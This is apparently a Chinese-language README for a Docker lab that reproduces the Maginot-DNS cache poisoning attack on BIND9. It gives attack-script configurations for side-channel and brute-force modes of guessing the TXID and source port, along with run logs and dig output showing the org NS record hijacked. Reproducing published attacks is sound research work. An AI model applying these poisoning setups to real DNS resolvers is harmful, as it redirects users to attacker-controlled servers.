# mdns-docker
## 说明
本仓库环境用于本地复现Maginot-DNS攻击(BIND9环境)

## 环境搭建
```shell
docker compose up --build
```

## 实验复现
为简化实验环境与最大限度复现实验效果，`attacker`本身部署有权威服务器(即`attacker`同时有权威服务器以及攻击者两个角色)，且该权威服务器与`attack.py`进行通信，**可以泄露关键信息**，`attack`可以采用多种模式利用或不利用接收到的信息模拟多种情况

### 模式一
极简攻击模式，完全利用权威服务器提供的侧信道(`TXID`、`Source Port`)，一次达成攻击目的，模拟的是真实场景下的中间人攻击
- 配置
    ```python
    # --- PORT Configuration ---
    # - Set to a range(...) to enable port brute-force mode.
    # - Set to None to enable precise port mode (fetches from side-channel).
    PORT_RANGE = None
    # (Brute-force mode only) Number of ports to guess per round.
    PORT_NUM = 20

    # --- Transaction ID (TXID) Configuration ---
    # - Set to a range(...) to enable TXID brute-force mode.
    # - Set to None to enable precise TXID mode (fetches from side-channel).
    ID_RANGE = None
    # (Brute-force mode only) Number of TXIDs to guess per round.
    ID_NUM = 5

    ROUND_MAX = -1 # Maximum number of rounds to attempt, set -1 for unlimited
    ```
- 攻击
    ```shell
    docker compose exec -it attacker python3 attack.py

    [INFO] Round 1: Starting...
    [INFO] Round 1: Waiting for side-channel intelligence...
    [INFO] Round 1: Sending 20 spoofed packets...

    [SUCCESS] Cache poisoned successfully in round 1!
    ```

### 模式二
单独将`TXID`或者`Source Port`设置为已知的范围，另一个继续**利用侧信道的信息**
- 设置`TXID`，`Source Port`保持利用信息时：相当于kaminsky攻击
- 设置`Source Port`, `TXID`保持利用信息时：相当于流量泛洪进行暴力猜解`TXID`，实验环境无法达到论文中的高带宽、高负载环境时，可以使用该方式模拟
<br>
<br>
<!-- fdsfa -->

- 配置
    ```python
    # --- PORT Configuration ---
    # - Set to a range(...) to enable port brute-force mode.
    # - Set to None to enable precise port mode (fetches from side-channel).
    PORT_RANGE = range(32768, 60999)
    # (Brute-force mode only) Number of ports to guess per round.
    PORT_NUM = 60

    # --- Transaction ID (TXID) Configuration ---
    # - Set to a range(...) to enable TXID brute-force mode.
    # - Set to None to enable precise TXID mode (fetches from side-channel).
    ID_RANGE = None
    # (Brute-force mode only) Number of TXIDs to guess per round.
    ID_NUM = 60

    ROUND_MAX = 2000 # Maximum number of rounds to attempt, set -1 for unlimited
    ```
- 攻击
    ```shell
    docker compose exec -it attacker python3 attack.py

    [INFO] Round 1999: Poisoning check skipped
    [INFO] Round 2000: Starting...
    [INFO] Round 2000: Waiting for side-channel intelligence...
    [INFO] Round 2000: Sending 60 spoofed packets...

    [SUCCESS] Cache poisoned successfully in round 2000!
    [INFO] Round 2000: Reached maximum iterations, stopping.
    ```

### 模式三
完全暴力猜解，完全不利用提供的信息进行攻击


### 攻击结果
`org`域的NS记录被篡改为`kie-chi.com`，该域名是一个能够正常访问的域名（为了躲避BIND9的有效性审查）
- 验证攻击结果
    ```shell
    docker compose exec -it attacker dig @10.2.0.2 org NS
    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.2.0.2 org NS
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51125
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 1232
    ; COOKIE: 0eb1568a28bcf538010000006897002a6aed9abe6c649a10 (good)
    ;; QUESTION SECTION:
    ;org.                           IN      NS

    ;; ANSWER SECTION:
    org.                    3586    IN      NS      kie-chi.com.

    ;; ADDITIONAL SECTION:
    kie-chi.com.            3586    IN      A       59.110.55.234

    ;; Query time: 0 msec
    ;; SERVER: 10.2.0.2#53(10.2.0.2) (UDP)
    ;; WHEN: Sat Aug 09 08:00:42 UTC 2025
    ;; MSG SIZE  rcvd: 101
    ```
    ```shell
    docker compose exec -it attacker dig @10.2.0.2 www.org  
    
    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.2.0.2 www.org
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29247
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 1232
    ; COOKIE: d64ccc96cec86be2010000006896ffda99accbeeb9787deb (good)
    ;; QUESTION SECTION:
    ;www.org.                       IN      A

    ;; ANSWER SECTION:
    www.org.                86400   IN      A       1.2.3.4

    ;; Query time: 449 msec
    ;; SERVER: 10.2.0.2#53(10.2.0.2) (UDP)
    ;; WHEN: Sat Aug 09 07:59:22 UTC 2025
    ;; MSG SIZE  rcvd: 80
    ```